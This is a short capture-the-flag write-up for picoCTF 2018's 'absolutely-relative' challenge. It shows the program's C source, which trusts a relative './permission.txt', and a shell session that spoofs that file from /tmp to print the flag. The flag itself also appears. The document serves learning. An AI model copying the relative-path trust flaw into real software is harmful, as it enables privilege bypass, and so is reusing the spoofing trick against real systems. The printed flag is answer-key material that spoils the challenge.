:checkered_flag: picoCTF{3v3r1ng_1$_r3l3t1v3_372b3859}

## Solve
In a filesystem, everything is relative ¯\_(ツ)_/¯. Can you find a way to get a flag from this [program](https://2018shell.picoctf.com/static/725b533a89a0e70b85b37ce2965da003/absolutely-relative)? You can find it in /problems/absolutely-relative_2_69862edfe341b57b6ed2c62c7107daee on the shell server. [Source](https://2018shell.picoctf.com/static/725b533a89a0e70b85b37ce2965da003/absolutely-relative.c).

## Hints
Do you have to run the program in the same directory? (⊙.☉)7

## Solution
```c
#include <stdio.h>
#include <string.h>

#define yes_len 3
const char *yes = "yes";

int main() {
  
    char flag[99];
    char permission[10];
    int i;
    FILE * file;

    file = fopen("/problems/absolutely-relative_2_69862edfe341b57b6ed2c62c7107daee/flag.txt" , "r");
    if (file) {
    	while (fscanf(file, "%s", flag)!=EOF)
    	fclose(file);
    }   
	
    file = fopen( "./permission.txt" , "r");
    if (file) {
    	  for (i = 0; i < 5; i++){
            fscanf(file, "%s", permission);
        }
        permission[5] = '\0';
        fclose(file);
    }
    
    if (!strncmp(permission, yes, yes_len)) {
        printf("You have the write permissions.\n%s\n", flag);
    } else {
        printf("You do not have sufficient permissions to view the flag.\n");
    }
    
    return 0;
}
```

```
shoulderhu@pico-2018-shell:~$ mkdir /tmp/shoulderhu
shoulderhu@pico-2018-shell:~$ cd /tmp/shoulderhu/
shoulderhu@pico-2018-shell:/tmp/shoulderhu$ echo "yes" > permission.txt
shoulderhu@pico-2018-shell:/tmp/shoulderhu$ /problems/absolutely-relative_2_69862edfe341b57b6ed2c62c7107daee/absolutely-relative 
You have the write permissions.
picoCTF{3v3r1ng_1$_r3l3t1v3_372b3859}
```
